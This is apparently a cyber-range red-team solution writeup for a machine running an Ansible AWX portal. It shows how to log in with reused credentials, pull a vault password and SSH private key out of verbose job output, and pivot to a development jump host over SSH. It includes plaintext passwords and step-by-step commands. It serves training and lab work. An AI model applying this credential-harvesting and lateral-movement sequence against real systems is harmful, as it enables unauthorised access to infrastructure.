# solve_red.md — M5 · itops-ansible
## Red Team Solution Writeup
**Range:** RNG-IT-02 · Internal Operations Zone
**Machine:** M5 — Ansible AWX Job Runner Portal
**Vulnerability:** Ansible Vault Password + SSH Private Key Exposed in Verbose Job Output
**MITRE ATT&CK:** T1552.001 (Credentials in Files) · T1552.004 (Private Keys) · T1059.006 (Python/Ansible)
**Severity:** Critical — Final RNG-IT-02 pivot to RNG-DEV-01

---

## Objective
Login to the AWX portal using credentials obtained from the Prometheus `/metrics` endpoint (M4). Enumerate historical job outputs. Locate job `deploy-dev-infra` (JOB-20241115-018) which ran with verbose logging enabled. Extract the Ansible vault password echoed in the output and the SSH private key for `dev-jump.prabalurja.in`. Use the key to SSH into the DEV zone jump host, completing the pivot to RNG-DEV-01.

---

## Environment
| Item | Value |
|---|---|
| Target IP | `203.x.x.x:8080` |
| Login Credential | `devops-admin : DevOps@PUL!24` (from M4 /metrics) |
| Vault Password | Extracted from job output |
| Pivot Host | `dev-jump.prabalurja.in (11.x.x.x)` |

---

## Step-by-Step Exploitation

### Step 1 — Login to AWX Portal
```
Browse: http://203.x.x.x:8080/login
Username: devops-admin
Password: DevOps@PUL!24
```

<img width="2498" height="1314" alt="image" src="https://github.com/user-attachments/assets/531ebf2c-bcdd-4a90-9679-ee9501d0d8ed" />



### Step 2 — Navigate to Job History
```
Browse: http://203.x.x.x:8080/jobs
```
Observe job list. Note `JOB-20241115-018 — deploy-dev-infra` as the most recent successful deployment job.

<img width="2559" height="1063" alt="image" src="https://github.com/user-attachments/assets/1588619e-b17e-4f99-883f-6ece38fc7219" />


### Step 3 — Open Job Output
```
Browse: http://203.x.x.x:8080/jobs/JOB-20241115-018
```

Scroll through output. Observe verbose task logging:

```
TASK [Load encrypted vault variables] ***
Executing: ansible-vault decrypt group_vars/all/vault.yml --vault-password-file=/etc/ansible/.vault_pass --output=-
Vault password file: /etc/ansible/.vault_pass
Vault password (read from file): Ansibl3Vault@PUL!GridFall2024       ← VAULT PASSWORD

TASK [Configure deployment SSH key] ***
-----BEGIN OPENSSH PRIVATE KEY-----
[... SSH PRIVATE KEY MATERIAL ...]
-----END OPENSSH PRIVATE KEY-----
```

<img width="2519" height="1362" alt="image" src="https://github.com/user-attachments/assets/2db71436-4e15-4843-9e32-e962f40e6dac" />


<img width="2498" height="1334" alt="image" src="https://github.com/user-attachments/assets/c16b3197-f453-40ff-bcb6-9e992db1cb2d" />


### Step 4 — Extract SSH Key and Save
```bash
# Copy key material from job output, save to file
cat > /tmp/dev_jump_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[paste key from job output]
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 /tmp/dev_jump_key
```

### Step 5 — Optional — Decrypt vault.yml via File Browser
```
Browse: http://203.x.x.x:8080/files?path=/group_vars/all/vault.yml
```
Decrypted preview rendered in browser — confirms SSH key, jump host `11.x.x.x`, user `devops`.

<img width="2003" height="892" alt="image" src="https://github.com/user-attachments/assets/2722672b-445c-438f-a591-4f335b70ce9f" />

### Step 6 — Pivot to RNG-DEV-01
```bash
ssh -i /tmp/dev_jump_key -o StrictHostKeyChecking=no \
    devops@dev-jump.prabalurja.in
# OR by IP if DNS not available:
ssh -i /tmp/dev_jump_key devops@11.x.x.x
```

<img width="1807" height="506" alt="image" src="https://github.com/user-attachments/assets/a1fa70fc-7fff-4378-a57b-54cd57b04895" />



<img width="1921" height="889" alt="image" src="https://github.com/user-attachments/assets/8bdd2ddb-f92d-4666-ab34-401e2976d98e" />



**PIVOT COMPLETE — RNG-DEV-01 entry achieved.**

---

## MITRE ATT&CK Mapping
| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Credential Access | Unsecured Credentials: Private Keys | T1552.004 |
| Execution | Command and Scripting: Python / Ansible | T1059.006 |
| Lateral Movement | Remote Services: SSH | T1021.004 |
